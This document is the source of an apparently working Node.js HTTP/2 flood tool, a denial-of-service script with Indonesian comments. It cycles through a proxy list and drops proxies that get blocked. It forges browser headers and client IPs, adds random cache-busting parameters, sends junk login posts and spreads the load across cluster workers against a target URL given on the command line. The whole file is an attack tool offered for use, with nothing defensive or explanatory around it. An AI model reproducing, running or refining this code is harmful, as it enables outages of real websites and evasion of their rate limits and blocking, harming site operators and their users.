const fs = require('fs');
const cluster = require('cluster');
const http2 = require('http2-wrapper');
const url = require('url');
const crypto = require('crypto');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]); // jumlah request per detik per worker
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (!target || !duration || !rate || !threads || !proxyFile) {
  console.error(`Usage: node script.js <target> <duration_seconds> <rate_per_worker> <threads> <proxyFile> [method]`);
  process.exit(1);
}

function getRandomMethod() {
  return Math.random() < 0.5 ? "GET" : "POST";
};

const proxies = fs.readFileSync(proxyFile, 'utf-8')
  .split('\n')
  .map(p => p.trim())
  .filter(Boolean);

let proxyIndex = 0;
const blacklist = new Set();

function getNextProxy() {
  let attempts = 0;
  while (attempts < proxies.length) {
    const proxy = proxies[proxyIndex];
    proxyIndex = (proxyIndex + 1) % proxies.length;
    if (!blacklist.has(proxy)) return proxy;
    attempts++;
  }
  return null; // semua proxy blacklist
}

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
  "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Redmi Note 9) AppleWebKit/537.36 Chrome/113.0.0.0 Mobile Safari/537.36"
];

const referers = [
  "https://www.google.com/",
  "https://www.bing.com/",
  "https://search.yahoo.com/",
  "https://duckduckgo.com/"
];

const acceptLanguages = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.8",
  "en-US,en;q=0.7,fr;q=0.3",
  "en;q=0.5"
];

function randomChoice(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomIP() {
  return `${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}`;
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function buildHeaders() {
  const ua = randomChoice(userAgents);
  const ref = randomChoice(referers);
  const lang = randomChoice(acceptLanguages);
  const etag = `"${crypto.randomBytes(8).toString('hex')}"`;
  const lastModified = new Date(Date.now() - rand(0, 3600000)).toUTCString();
  const cookieVal = `session=${crypto.randomBytes(8).toString('hex')}; tracking=${crypto.randomBytes(4).toString('hex')}`;

  return {
    "accept": "*/*",
    "accept-language": lang,
    "user-agent": ua,
    "referer": ref,
    "cookie": cookieVal,
    "cache-control": "max-age=0, no-cache",
    "pragma": "no-cache",
    "if-none-match": etag,
    "if-modified-since": lastModified,
    "x-forwarded-proto": "https",
    "x-real-ip": randomIP(),
    "x-request-id": crypto.randomBytes(4).toString('hex'),
  };
}

function createAgent(proxy) {
  if (!proxy) return null;
  const [host, port] = proxy.split(':');
  if (!host || !port) return null;

  return new http2.Agent({
    proxy: { uri: `http://${host}:${port}` },
    maxConcurrentStreams: 1000,
    maxHeaderListSize: 262144,
  });
}

function doRequest(agent, targetUrl) {
  return new Promise((resolve, reject) => {
    const parsed = url.parse(targetUrl);
    const clientHeaders = buildHeaders();
    const method = getRandomMethod()
    const cacheBypassParam = `cb=${crypto.randomBytes(4).toString('hex')}`;
    const pathWithCache = (parsed.path || '/') + (parsed.path?.includes('?') ? `&${cacheBypassParam}` : `?${cacheBypassParam}`);

    const client = http2.connect(targetUrl, {
      agent,
      maxConcurrentStreams: 1000,
      maxHeaderListSize: 262144,
      rejectUnauthorized: false,
      ALPNProtocols: ['h2'],
      servername: parsed.hostname,
    });

    client.setTimeout(5000);

    client.on('error', (err) => {
      client.destroy();
      reject(err);
    });

    client.on('timeout', () => {
      client.destroy();
      reject(new Error("Timeout"));
    });

    client.on('close', () => {
      resolve();
    });

    client.on('connect', () => {
      const headers = {
        ":method": method,
        ":path": pathWithCache,
        ":scheme": "https",
        ":authority": parsed.hostname,
        ...clientHeaders
      };

      const req = client.request(headers);

      if (method === "POST") {
        const postData = `username=${crypto.randomBytes(4).toString('hex')}&password=${crypto.randomBytes(6).toString('hex')}`;
        req.write(postData);
      }

      req.on('response', (headers) => {
        if ([403, 429].includes(headers[':status'])) {
          reject(new Error(`Blocked status ${headers[':status']}`));
          client.close();
        }
      });

      req.setTimeout(4000, () => {
        req.close(http2.constants.NGHTTP2_CANCEL);
        client.close();
        reject(new Error('Request timeout'));
      });

      req.end();
    });
  });
}

async function floodLoop(ratePerSec, method) {
  while (true) {
    const proxy = getNextProxy();
    if (!proxy) {
      console.error("No more proxies available (all blacklisted). Exiting worker.");
      process.exit(1);
    }

    const agent = createAgent(proxy);
    if (!agent) {
      console.error(`Invalid proxy format: ${proxy}`);
      blacklist.add(proxy);
      continue;
    }

    const requests = [];
    for (let i = 0; i < ratePerSec; i++) {
      requests.push(
        doRequest(agent, target, method)
          .catch(e => {
            if (e.message.includes('Blocked')) {
              // Blacklist proxy jika terkena block 403/429
              blacklist.add(proxy);
              console.log(`Blacklisted proxy ${proxy} due to block.`);
            }
          })
      );
    }

    try {
      await Promise.all(requests);
    } catch (e) {
      // ignore errors to continue flood
    }

    await new Promise(r => setTimeout(r, 1000));
  }
}

if (cluster.isPrimary) {
  console.log(`Starting flood: ${threads} workers, ${rate} RPS per worker, duration: ${duration}s`);
  for (let i = 0; i < threads; i++) cluster.fork();

  setTimeout(() => {
    console.log('Flood ended, exiting master...');
    process.exit(0);
  }, duration * 1000);
} else {
  floodLoop(rate, method);
}
